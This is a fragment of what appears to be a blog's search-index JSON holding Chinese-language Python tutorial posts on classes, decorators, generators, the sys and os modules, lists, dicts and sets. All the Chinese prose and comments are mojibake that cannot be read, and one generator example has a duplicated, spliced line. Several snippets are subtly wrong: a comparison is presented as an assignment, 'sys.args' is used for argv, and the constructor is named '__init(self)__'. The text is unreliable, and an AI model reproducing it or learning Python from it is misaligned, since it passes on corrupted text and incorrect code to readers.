animal_obj.price))) def Resign(self, worker_obj): #é‡å†™ print(\"ç®¡ç†å‘˜è¾é€€äº† %s \" % worker_obj.name) self.workers.remove(worker_obj) class Home(object): def myHome(self): print(\"æˆ‘çš„å®¶åœ¨ %s \" % self.addr) class Worker(Manager, Home): def __init__(self,name,addr,age,sex,id): # å¹¿åº¦æŸ¥è¯¢ Manager --\u003e Home --\u003e Farm super(Worker,self).__init__(name, addr, age, sex) self.id = id def Info(self): # é‡å†™ print(''' --- å·¥äººä¿¡æ¯ %s --- ç¼–å·ï¼š %s åå­—ï¼š %s æ€§åˆ«ï¼š %s å¹´é¾„ï¼š %s å®¶åº­åœ°å€ï¼š %s ''' % (self.name,self.id,self.name,self.sex,self.age,self.addr)) class Animals(Manager, FarmMember): def __init__(self,name,num,price): # é‡è½½ self.name = name self.num = num self.price = price def Info(self): # é‡å†™ print(''' --- åŠ¨ç‰©ä¿¡æ¯ %s åå­—: %s æ•°é‡ï¼š%s å•ä»·ï¼š%s ''' %(self.name,self.name,self.num,self.price)) # å®ä¾‹åŒ–å†œåœº fmmr = FarmMember(\"è‰åŸ1å·\", \"å±±å’”å’”\") # å®ä¾‹åŒ–ç®¡ç†å‘˜ fr = Manager(\"å¼ ä¸‰\", \"é‡åº†\", \"33\", \"ç”·\") fmmr.Recruit(fr) # ç”³è¯·ä¸€ä¸ªç®¡ç† fr.Info() #å®ä¾‹åŒ–æ™®é€šå‘˜å·¥ wr1 = Worker(\"æå››\",\"åŒ—äº¬\",\"21\",\"ç”·\",1001) wr1.Info() wr2 = Worker(\"ç‹äº”\",\"ä¸Šæµ·\",\"22\",\"ç”·\",1002) wr2.Info() wr3 = Worker(\"èµµå…­\", \"å¹¿å·\", \"22\", \"ç”·\", 1003) wr3.Info() wr3.myHome() # æ‹›è˜ä¸€ä¸ªæ™®é€šå‘˜å·¥ fr.Recruit(wr1) fr.Recruit(wr2) fr.Recruit(wr3) # å®ä¾‹åŒ–åŠ¨ç‰© dw1 = Animals(\"å°é¸¡\",12,6.7) dw2 = Animals(\"å°é¸­\",22,4.5) fr.BuyAnimal(dw1) fr.SellAnimal(dw2) fr.Resign(wr2) print(\"%s ç®¡ç†å‘˜ä¸‹çš„å·¥äººè¿˜æœ‰ \" % fr.name) for i in fr.workers: print(i.name) 5. ç±»æ–¹æ³•ã€é™æ€æ–¹æ³•ã€å±æ€§æ–¹æ³•ã€property é™æ€æ–¹æ³•ï¼š é€šè¿‡ä¿®é¥°å™¨@staticmethodæ¥è¿›è¡Œä¿®é¥°çš„æ–¹æ³•ï¼Œé™æ€æ–¹æ³•ä¸éœ€è¦å®šä¹‰å‚æ•°ï¼Œå› æ­¤åœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨ç±»å±æ€§çš„è¯ï¼Œå¿…é¡»é€šè¿‡ç±»å¯¹è±¡æ¥å¼•ç”¨(å®é™…ä¸Šä¸å¯ç›´æ¥è®¿é—®ç±»å’Œå®ä¾‹ä¸­çš„ä»»ä½•å±æ€§å’Œæ–¹æ³•)ã€‚å¯é€šè¿‡å®ä¾‹å¯¹è±¡æˆ–ç±»å¯¹è±¡è¿›è¡Œè®¿é—®ã€‚ ç±»æ–¹æ³•ï¼š æ˜¯ç±»å¯¹è±¡æ‰€æ‹¥æœ‰çš„æ–¹æ³•ï¼Œéœ€è¦ç”¨ä¿®é¥°å™¨@classmethodæ¥æ ‡è¯†å…¶ä¸ºç±»æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å¯¹è±¡ï¼Œä¸€èˆ¬ä»¥clsä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚å¯é€šè¿‡å®ä¾‹å¯¹è±¡æˆ–ç±»å¯¹è±¡è¿›è¡Œè®¿é—®ã€‚ç±»æ–¹æ³•åªèƒ½è®¿é—®ç±»å˜é‡ï¼Œä¸å¯è®¿é—®å®ä¾‹(self)å˜é‡ã€‚ å±æ€§æ–¹æ³•ï¼š é€šè¿‡@propertyæ¥è¿›è¡Œä¿®é¥°ï¼Œå¯ä»¥å°†ç±»æ–¹æ³•è½¬æ¢ä¸ºå±æ€§å¯¹è±¡ï¼Œä½¿å…¶è°ƒç”¨æ—¶å€™å¯ä»¥ç›´æ¥é€šè¿‡å®ä¾‹å¯¹è±¡åƒè°ƒç”¨ç±»å±æ€§ä¸€æ ·è¿›è¡Œè°ƒç”¨ï¼Œå…¶æ€»å…±åŒ…å«ä¸‰ç§è®¿é—®å½¢å¼@property, @æ–¹æ³•å.setter, @æ–¹æ³•å.deleterã€‚ä¸€èˆ¬ç”¨æ¥å¤„ç†ç§æœ‰å˜é‡ã€‚å’Œjavaçš„getterã€setteræ–¹æ³•æœ‰ç‚¹ç±»ä¼¼(å§ï¼Ÿä¸ªäººæ„Ÿè§‰æ²¡ä»€ä¹ˆåµç”¨çš„æ ·å­ï¼Œå¯èƒ½æ˜¯æ²¡æœ‰ç”¨åˆ°) propertyï¼š å¤§éƒ¨åˆ†çš„è§£é‡Šæ˜¯å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨æ–°å¼ç±»ä¸­è¿”å›å±æ€§å€¼,ä¸ªäººè¿˜å¹¶ä¸æ˜¯ç‰¹åˆ«ç†è§£è¿™ä¸ªçš„æ„æ€ï¼Œä¸è¿‡ç”¨javaæ¥å¯¹æ¯”çš„è¯,å°±æ˜¯getterã€setterçš„å‡çº§ç‰ˆã€‚propertyæ€»å…±åŒ…å«4ä¸ªå‚æ•°: ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œåœ¨è°ƒç”¨(ç±»/å®ä¾‹)å¯¹è±¡.å±æ€§è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•; ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œåœ¨è°ƒç”¨(ç±»/å®ä¾‹)å¯¹è±¡.å±æ€§=xxæ—¶è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•; ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œåœ¨è°ƒç”¨del (ç±»/å®ä¾‹)å¯¹è±¡.å±æ€§æ—¶è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•; ç¬¬å››ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œåœ¨è°ƒç”¨å®ä¾‹å¯¹è±¡.å±æ€§.__doc__,æ­¤å‚æ•°æ˜¯è¯¥å±æ€§çš„æè¿°ä¿¡æ¯; ç¤ºä¾‹ï¼š class FarmMember(object): addr = \"xxx.xxx\" def __init__(self, title): self.title = title self.__ID = None self.__systemID = None @classmethod def ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:0:0","tags":["linux","python"],"title":"Python å‡½æ•°ç›¸å…³(äºŒ)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å‡½æ•°ç›¸å…³","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/","tags":["linux","python"],"title":"Python å‡½æ•°ç›¸å…³(ä¸€)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å‡½æ•°å‚æ•°é‡Šä¹‰ å¿…é€‰å‚æ•° å‡½æ•°å®šä¹‰æ—¶,å®šä¹‰äº†æ¥æ”¶å˜é‡,é‚£ä¹ˆåœ¨å‡½æ•°è°ƒç”¨æ—¶å°±å¿…é¡»ä¼ é€’è¯¥å‚æ•°å€¼ é»˜è®¤å‚æ•° åœ¨å‡½æ•°å®šä¹‰æ—¶,å¯ä¸ºéœ€è¦æ¥å—å€¼çš„å‚æ•°è®¾ç½®ä¸€ä¸ªé»˜è®¤å€¼,è‹¥å‡½æ•°è°ƒç”¨æ—¶,è¯¥å‚æ•°æœªä¼ å…¥å€¼æ—¶,åˆ™ä½¿ç”¨é»˜è®¤å€¼ å¯å˜å‚æ•° *args(å…³é”®å­—å‚æ•°) : å¯å‘å‡½æ•°ä¸­ä¼ é€’0ä¸ªæˆ–å¤šä¸ªå‚æ•°(ç±»ä¼¼Stringâ€¦args),å†…éƒ¨å˜é‡è‹¥ä¸º*args,ç»“æœå°†ä¸ºå…ƒç»„,ç‹¬ç«‹å€¼å°†ä¼šé¡ºåºæ¥æ”¶ **kwargs(å‘½åå…³é”®å­—å‚æ•°) : å¯å‘å‡½æ•°ä¸­ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¼ é€’0ä¸ªæˆ–å¤šä¸ªå‚æ•°,å†…éƒ¨å˜é‡è‹¥ä¸º**kwargs,ç»“æœå°†ä¸ºå­—å…¸,ç‹¬ç«‹å€¼å°†ä¼šé¡ºåºæ¥æ”¶ ç»„åˆå‚æ•° ç”¨å¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°ã€å…³é”®å­—å‚æ•°å’Œå‘½åå…³é”®å­—å‚æ•°ï¼Œè¿™5ç§å‚æ•°å¯ç»„åˆä½¿ç”¨,ä½†å‚æ•°ä¼ é€’é¡ºåºå¿…é¡»æ˜¯: å¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°ã€å‘½åå…³é”®å­—å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚ 2. å‡½æ•°å³\"å˜é‡\" 3. é«˜é˜¶å‡½æ•° ä¸€ä¸ªå˜é‡å¯ä»¥æŒ‡å‘å‡½æ•°ï¼Œå‡½æ•°çš„å‚æ•°èƒ½æ¥æ”¶å˜é‡ï¼Œé‚£ä¹ˆä¸€ä¸ªå‡½æ•°å°±å¯ä»¥æ¥æ”¶å¦ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¿™ç§å‡½æ•°å°±ç§°ä¹‹ä¸ºé«˜é˜¶å‡½æ•° 4. åµŒå¥—å‡½æ•° ä¸€ä¸ªå‡½æ•°ä¸­å¯ä»¥åŒ…å«å¦ä¸€ä¸ªå‡½æ•° 5. è£…é¥°å™¨ ç¤ºä¾‹ä»£ç 1: import time def wrapper(func): def demo(*args, **kwargs): print(\"è£…é¥°å™¨å‡½æ•°å‚æ•°è°ƒç”¨å±‚ : \", time.time()) res = func(*args, **kwargs) print(\"è£…é¥°å™¨å‡½æ•°è°ƒç”¨å‡½æ•°å‚æ•° : \", args, kwargs) return res return demo @wrapper # æ³¨å…¥? # å‡½æ•°å³å˜é‡ #@test == { # test2=test(test1); #è°ƒç”¨ # test2(11, a=\"01\") #} == { test1 = test(test1) } def calc(x, **kwargs): y = x * 10 return \"è®¡ç®—ç»“æœ y : %s\" % y calc(11, a=\"01\") print(\"=======================\") print(calc(11, a=\"01\")) ç¤ºä¾‹ä»£ç 2: import time def wrapper(ltype): print(\"è£…é¥°å™¨å‚æ•°ä¼ é€’å±‚ wrapper: \",ltype) def demo(func): print(\"è£…é¥°å™¨å‡½æ•°ä¼ é€’å±‚ demo: \", ltype, func) def A(*args, **kwargs): print(time.time()) print(\"è£…é¥°å™¨è°ƒç”¨å‡½æ•°å‚æ•°ä¼ é€’å±‚ A : \", args, kwargs,ltype,func) res = func(*args,**kwargs) print(\"è£…é¥°å™¨å‚æ•°ä¼ é€’å€¼ ltype :\", ltype) return res return A return demo @wrapper(ltype=\"Add\") def calc(x,y,name): z = x + y print(z) return z print(calc(1, 2,name=\"123\")) 6. ç”Ÿæˆå™¨ åœ¨pythonä¸­, ä¸€è¾¹å¾ªç¯,ä¸€è¾¹è®¡ç®—çš„æœºåˆ¶,å°±å«åšç”Ÿæˆå™¨. ç”Ÿæˆå™¨ä¸ä¼šç¬¬ä¸€æ—¶é—´å°†æ‰€æœ‰ç»“æœç”Ÿæˆå‡ºæ¥,ä»–åªä¼šåœ¨å¾ªç¯åˆ°(è°ƒç”¨)çš„æ—¶å€™æ‰ä¼šç”Ÿæˆéœ€è¦çš„å€¼,å› æ­¤å¯¹äºç”Ÿæˆå™¨äº§ç”Ÿçš„å€¼æ˜¯ä¸å…è®¸åˆ‡ç‰‡çš„,å¦å¤–,ä»–æ¯æ¬¡è°ƒç”¨ä¹Ÿä»…ä»…åªä¿ç•™å½“å‰æ­£åœ¨è¢«è°ƒç”¨çš„è¿™ä¸ªå€¼ ç”Ÿæˆå™¨å®šä¹‰, å¯¹äºåˆ—è¡¨ç”Ÿæˆå¼å°†[] æ›¿æ¢ä¸º (),åˆ›å»ºå‡ºæ¥çš„ç»“æœå°±æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨ ,å¯¹äºå‡½æ•°,åŒ…å«äº†yelidå˜é‡(å¯ç”¨äºæ¨¡æ‹Ÿå¤šçº¿ç¨‹)çš„å°±æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨. 6.1. ç”Ÿæˆå™¨åˆ›å»º ç¤ºä¾‹1: # åˆ—è¡¨åˆ›å»º arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] # åˆ—è¡¨ç”Ÿæˆå¼åˆ›å»º arr = ( i*2 for i in range(10) ) # arr = \u003cgenerator object \u003cgenexpr\u003e at 0x7fa19c4b9570\u003e arr.__next__() ç¤ºä¾‹2: # è²æ³¢æ‹‰å¥‘æ•°åˆ— # 0 1 1 2 3 5 8 13 21 34 ... def fib(max): n, a , b = 0, 0, 1 while n \u003c max: yield b a, b = b, a+b n = n + 1 return \"None\" fib(10) # fib(100) = \u003cgenerator object fib at 0x7efc212447c8\u003e # fi = fib(10) # print(next(fi)) # print(fi.__next__()) # ç›¸å…³è§£é‡Š # 1. yield å¯ä»¥çœ‹æˆä¸€ä¸ªreturnä½†ä¹Ÿæœ‰ä¸åŒ,å½“å¾ªç¯æ¯æ¬¡æ‰§è¡Œåˆ°æ­¤å¤„çš„æ—¶å€™,ä»–ä¼šè¿”å›ç»“æœå€¼å¹¶æš‚åœæ­¤æ¬¡å¾ªç¯,ä»¥ç­‰å¾…ä¸‹ä¸€æ¬¡çš„è°ƒç”¨ # # 2. ç­‰å¼ a,b = b, a+b å¹¶ä¸ç­‰äº # { # a = b # b = a+b # } # å®é™…ç­‰äº # t = (a, a+b) # a = t[0] # b = t[1] # å…³äºå‡½æ•°çš„return # ç”±äºç”Ÿæˆç”Ÿæˆå™¨çš„è°ƒç”¨å¿…é¡»ä½¿ç”¨__next__()æ¥è¿›è¡Œ,è€Œæ•°æ®çš„ç”Ÿæˆå¤§éƒ¨åˆ†çš„æ—¶å€™éƒ½å°†ä¼šæœ‰æœ€ç»ˆçš„ç»“æœ,è€Œ__next__()çš„æ—¶å€™æ˜¯ä¸ä¼šçŸ¥é“ä¸‹ä¸€ä¸ªå€¼æ˜¯å¦çœŸæ­£çš„å­˜åœ¨, # æ­¤æ—¶__next__()å°±å°†ä¼šæŠ›å‡ºä¸€ä¸ªç¨‹åºå¼‚å¸¸,è€Œè¿™ä¸ªå¼‚å¸¸çš„å€¼å°±æ˜¯returnè¿”å›çš„å€¼ . 6.2. ç”Ÿæˆå™¨è°ƒç”¨ ç”Ÿæˆå™¨çš„è°ƒç”¨, åœ¨2.7ä¸­ä½¿ç”¨çš„æ˜¯ next(arr), 3.xä¸­ä½¿ç”¨çš„æ˜¯arr.__next__(),ä¸è¿‡next(arr) åœ¨3.xåŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨ 6.3. ç”Ÿæˆå™¨æ¨¡æ‹Ÿå¤šçº¿ç¨‹è¿è¡Œç¤ºä¾‹(åç¨‹) def work(name): print(\"%s å‡†å¤‡å¼€å§‹å·¥ä½œ !\" %name) while True: things = yield name # yield åé¢å¯è·Ÿä¸€ä¸ªå€¼,è¯¥å€¼ä¸ºsend()è°ƒç”¨åè¿”å›ç»“æœ print(\"%d å·æ–‡ä»¶å·²ç»æ”¶åˆ°äº† , %s æ‰“å¼€äº†ç”µè„‘, å¼€å§‹å·¥ä½œ !\" %(things,name)) import time def people(): w1 = work(\"ç”¨æˆ·1\") # å‡½æ•°è°ƒç”¨ä»…ä»£è¡¨åˆ›å‡º w1 = work(\"ç”¨æˆ·1\") # å‡½æ•°è°ƒç”¨ä»…ä»£è¡¨åˆ›å‡ºå»ºä¸€ä¸ªç”Ÿæˆå™¨ å»ºä¸€ä¸ªç”Ÿæˆå™¨ w2 = work(\"ç”¨æˆ·2\") w1.__next__() # åªæœ‰åœ¨è°ƒç”¨çš„æ—¶å€™æ‰ä¼šè¿›è¡Œç¬¬ä¸€æ¬¡next,ä»è€Œæš‚åœåˆ° yield å¤„ w2.__next__() for i in range(5): time.sleep(1) num = i+1 print(\"%s å·å·¥ä½œä»»åŠ¡æ–‡ä»¶æ¥äº† ! \" % num) ww1 = w1.send(num) ww2 = w2.send(num) print(\"ww1: %s, ww2: %s\" %(ww1,ww2)) people() 7. æ„é€ å‡½æ•°å’Œææ„å‡½æ•° # æ„é€ å‡½æ•°__init(self)__, ç”¨äºç±»è¢«å®ä¾‹åŒ–æ—¶å€™ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºåˆå§‹åŒ–å®ä¾‹å˜é‡ ,æ¯ä¸ªç±»å¿…é¡»æœ‰ä¸€ä¸ªæ„é€ å‡½æ•° # ææ„å‡½æ•°__del(self)__, ä¸€èˆ¬ç”¨äºåœ¨å®ä¾‹è¢«é”€æ¯ã€é‡Šæ”¾çš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸ç”¨äºä¸€äº›æ”¶å°¾å·¥ä½œï¼Œæ¯”å¦‚æ•°æ®åº“é“¾æ¥ï¼Œæ‰“å¼€çš„ä¸´æ—¶æ–‡ä»¶ç­‰ class Demo(object): c = 000 def __init__(self,name): self.name = name def __del__(self): print(\"del: \",self.name, self.c) print(\"å‡½æ•°å…³é—­\") d = Demo(\"Tname\") d.c = 111 d.c1 = 222 print(d.c, d.c1 , d.name) 8. ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³• åœ¨Pythonç±»ä¸­ä»¥__å¼€å¤´çš„å˜é‡ä¸ºç§æœ‰å˜é‡(å±æ€§)ï¼Œä»¥__å¼€å¤´çš„å‡½æ•°ä¸ºç§æœ‰å‡½æ•°(æ–¹æ³•),ä»–ä»¬åœ¨ç±»çš„å¤–éƒ¨ä¸å¯æŸ¥ï¼Œä¸å¯è¢«è°ƒç”¨ class Demo(object): __c = 111 def __init__(self,name): self.name = name self.__age = 123 def __b(): print(\"hello\") d = Demo(\"Tname\") print(d.__c, d.__age) \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 13, in \u003cmodule\u003e print(d.__c, d.__age) AttributeError: 'Demo' object has no attribute '__c' \"\"\" d.__b() \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 22, in \u003cmodule\u003e d.__b() AttributeError: 'Demo' object has no attribute '__b' \"\"\" 9. è¿­ä»£(Iterable) ä»æŸä¸ªåœ°æ–¹ï¼ˆæ¯”å¦‚ä¸€ä¸ªåˆ—è¡¨ï¼‰å–å‡ºä¸€ä¸ªå…ƒç´ çš„è¿‡ç¨‹ã€‚å½“æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥éå†æŸä¸ªä¸œè¥¿æ—¶ï¼Œè¿™ä¸ªè¿‡ç¨‹æœ¬èº«å°±å«è¿­ä»£ åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¿­ä»£(å¯¹è±¡): from collections.abc import Iterable print(isinstance('abc', Iterable)","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:0:0","tags":["linux","python"],"title":"Python å‡½æ•°ç›¸å…³(ä¸€)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"åŸºç¡€è¯­æ³•","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","tags":["linux","python"],"title":"Python åŸºç¡€è¯­æ³•","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å¾ªç¯æ³¨æ„ for item in range(10): print(item) if item == 2: break else: # å½“ä¸Šè¿°å¾ªç¯æ­£å¸¸å®Œæ•´çš„æ‰§è¡Œå®Œåæ‰§è¡Œå½“å‰åˆ†æ”¯å†…å®¹, breakä¸ºéæ­£å¸¸æ‰§è¡Œå®Œæˆ,ä¸æ‰§è¡Œelseå†…å®¹ print(\"hello\") i=0 while i \u003c 3: print(i) i +=1 else: # å½“ä¸Šè¿°å¾ªç¯æ­£å¸¸æ‰§è¡Œå®Œæˆåæ‰§è¡Œå½“å‰åˆ†æ”¯å†…å®¹,breakä¸ºéæ­£å¸¸æ‰§è¡Œ print(\"i=3\",i) 2. ä¸‰å…ƒè¿ç®— # å¦‚æœæ¡ä»¶æˆç«‹ å€¼1 å¦åˆ™ å€¼2 result = å€¼1 if æ¡ä»¶ else å€¼2 3. range # å…±10ä¸ªæ•°, ä»0 å¼€å§‹ æ‰“å°åˆ°9 for i in range(10) : print(i) #å…±10ä¸ªæ•°,ä»0å¼€å§‹,æ¯éš”2ä¸ªæ•°æ‰“å°ä¸€æ¬¡ for i in range(0,10,2): print(i) 4. python æ¨¡å— 4.1. sys print(sys.path) # æ‰“å°ç³»ç»Ÿç¯å¢ƒå˜é‡ print(sys.args) # æ‰“å°è„šæœ¬ä¼ é€’å‚æ•° ç¬¬ä¸€ä¸ªä¸ºè„šæœ¬åç§°($(pwd)/script_name) åç»­ä¸ºè„šæœ¬ä¼ é€’çš„å‚æ•°å€¼ 4.2. os print(os.system(\"ls\")) # æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å¹¶å°†ç»“æœæ‰“å°åˆ°å‰å°,å¹¶è¿”å›æ‰§è¡ŒçŠ¶æ€(æˆåŠŸ)0æˆ–é0(å¤±è´¥) print(os.popen(\"ls\").read()) # æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å¹¶å°†ç»“æœå­˜å…¥å†…å­˜ä¸­,ä½¿ç”¨readè¯»å–å¹¶æ‰“å°åˆ°å‰å° 5. æ•°ç»„ç±»å‹ 5.1. bytes msg = \"ä½ å¥½ , Python! \" print(msg.encode(encoding=\"UTF-8\")) print(msg.encode(encoding=\"utf-8\").decode(encoding=\"utf-8\")) 5.2. åˆ—è¡¨ 5.2.1. åˆ—è¡¨å°±æ˜¯javaçš„æ•°ç»„,ä¸è¿‡pythonçš„åˆ—è¡¨å¯ä»¥å„ä¸ªç±»å‹æ··ç”¨ ### åˆ—è¡¨ç”Ÿæˆå¼ ### # arr = [ i*2 for i in range(10) ] åˆ—è¡¨ä¸­å¯ä»¥æ˜¯å‡½æ•°è°ƒç”¨ # arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] ### åˆ—è¡¨ç”Ÿæˆå¼ ### arr = [\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1] arr2 = [1,2,3,4] arr3 = [\"01\", \"02\", \"03\"] print(arr[0],arr[3]) #åˆ‡ç‰‡: å–å‡ºä¸‹æ ‡ä¸º0-2çš„å­—ç¬¦ä¸²,åŒ…å‰ä¸åŒ…å print(arr[0:3]) #åˆ‡ç‰‡: å–å‡ºæœ€åä¸€ä¸ªå€¼ print(arr[-1]) #åˆ‡ç‰‡: å–å‡ºæœ€å3ä¸ªå€¼ print(arr[-3:]) #åˆ‡ç‰‡: å–å‡ºå€’æ•°ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå€¼ print(arr[-3:-1]) #åˆ‡ç‰‡: æ¯éš”ä¸€ä¸ªå€¼å–å€¼ print(arr[1:-1:2]) # == arr[::2] # å¢åŠ  arr.append(\"zz\") # æ’å…¥ arr.insert(0,\"aa\") # ä¿®æ”¹ arr[2] == \"bb\" # åˆ é™¤ arr.remove(\"d\") del arr[4] # 4 : e # é»˜è®¤åˆ é™¤æœ€åä¸€ä¸ªå€¼, arr.pop() # åˆ é™¤å€’æ•°ç¬¬äºŒä¸ªå€¼ å’Œ del arr[-2] ç­‰ä»· arr.pop(-2) # æŸ¥è¯¢ print(arr.index(\"aa\")) # ç»Ÿè®¡å€¼æ€»å…±çš„ä¸ªæ•° print(arr.count(\"z\")) # åè½¬åˆ—è¡¨å€¼ arr.reverse() # åˆ—è¡¨åˆå¹¶,æ–°åˆ—è¡¨è¿½åŠ åˆ°æœ«å°¾ arr.extend(arr2) # åˆ é™¤åˆ—è¡¨ del arr2 arr.append(arr3) # åˆ—è¡¨å¤åˆ¶(æµ…copy: åªå¤åˆ¶ç¬¬ä¸€å±‚) { # ä½œç”¨: ç”¨äºåˆ›å»ºè”åˆè´¦å· #arr4 = arr[:] #arr4 = list(arr) arr4 = arr.copy() del arr3 arr[0] = \"AA\" arr[-1][0] = \"001\" print(arr) print(arr4) # arr=['AA', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] # arr4=['aa', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] } # ç­‰å·èµ‹å€¼ { arr5 = arr arr[11][1] = \"002\" print(arr,arr5) # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } # æ·±COPY { import copy # copy.copy ç›¸å½“äº åˆ—è¡¨çš„copy arr6 = copy.deepcopy(arr) arr[-1][2] = \"003\" arr[6] = 11 print(arr,arr6) # ['AA', 'a', 'BB', 'c', 'z', 'z', 11, 1, 2, 3, 4, ['001', '002', '003']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } 5.2.2. åˆ—è¡¨ COPY å›¾ç¤º æµ… copy å›¾ç¤º ç­‰å€¼å›¾ç¤º æ·± COPY å›¾ç¤º 5.2.3. åˆ—è¡¨éå†ç´¢å¼•çš„å‡ ç§æ–¹å¼ arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # 1. n = 0 for i in arr: print(n,i) n += 1 # 2. print(\"-----------\") for i in range(len(arr)): print(i,arr[i]) # 3. print(\"-----------\") for i,item in enumerate(arr): print(i,item) 5.3. å…ƒç»„(åªè¯»åˆ—è¡¨) # åªèƒ½æŸ¥çœ‹ã€åˆ‡ç‰‡ arr = (\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1) 5.4. å­—å…¸(map) key, value å­—å…¸æ— åº key å”¯ä¸€ info = { 'A': \"1\", \"B\": \"2\", \"C\": \"33\" } print(info[\"A\"]) # å­˜åœ¨ä¿®æ”¹ ä¸å­˜åœ¨ æ–°å¢ info[\"A\"] = \"11\" info[\"D\"] = \"44\" # åˆ é™¤ del info[\"A\"] info.pop(\"D\") # éšæœºåˆ é™¤ info.popitem() ## æŸ¥è¯¢ info[\"A\"] # å­˜åœ¨è¿”å›å€¼,ä¸å­˜åœ¨æŠ›å‡ºå¼‚å¸¸ print(info.get(\"B\")) # å­˜åœ¨è¿”å›å€¼,ä¸å­˜åœ¨è¿”å›None print(\"B\" in info) # å­˜åœ¨è¿”å›True ä¸å­˜åœ¨ è¿”å›False # è‹¥ keyå­˜åœ¨,åˆ™ä¸åšä»»ä½•æ“ä½œ,è‹¥keyä¸å­˜åœ¨,åˆ™æ–°å¢å­—å…¸å€¼ info.setdefault(\"A\",\"000\") info1 = { \"A\":\"111\", 1 : \"2\" } # åˆå¹¶ä¸¤ä¸ªå­—å…¸çš„å€¼,ç›¸åŒkeyåˆ™æ›´æ–°,ä¸åŒç›´æ¥åˆå¹¶ info.update(info1) # å°†å­—å…¸è½¬æ¢ä¸ºåˆ—è¡¨ info2 = info.items() # åˆå§‹åŒ–æ–°çš„å­—å…¸key 1,2,3 value: default (ä»…é€‚ç”¨äºåˆ›å»ºä¸€ç»´å­—å…¸,å¤šä¸ºå­—å…¸å­˜åœ¨æµ…COPYçš„é—®é¢˜) info3 = dict.fromkeys([1,2,3],\"default\") # å­—å…¸å¾ªç¯ for i in info: print(\"in:\", i,info[i]) for k,v in info.items(): print(\"kv:\",k,v) 5.5. é›†åˆ arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # å°†åˆ—è¡¨è½¬æ¢ä¸ºé›†åˆ(åˆå¹¶é‡å¤é¡¹,å¯ç”¨äºåˆ—è¡¨å»é‡å¤) arr = set(arr) # é›†åˆå®šä¹‰ arr1 = set([\"a\", \"b\", \"c\", \"dd\", \"ee\", \"z\"]) arr2 = set([\"aa\", \"bb\", \"cc\", \"dd\", \"ee\", \"zz\"]) arr3 = set([\"a\", \"b\", \"c\"]) # è·å–é›†åˆé•¿åº¦ print(len(arr1)) # åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦åœ¨é›†åˆå†… True/False print(\"a\" in arr1) # åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸åœ¨é›†åˆå†… True/False print(\"a\" not in arr1) # è·å–é›†åˆäº¤é›† arr4 = arr1.intersection(arr2) # (arr1 \u0026 arr2) print(arr4) # è·å–é›†åˆå¹¶é›† arr5 = arr1.union(arr2) # (arr1 | arr2) print(arr5) # è·å–é›†åˆå·®é›†(arr1ä¸­å­˜åœ¨,arr2ä¸­ä¸å­˜åœ¨) arr6 = arr1.difference(arr2) # (arr1 - arr2 ) print(arr6) # åˆ¤æ–­ arr1 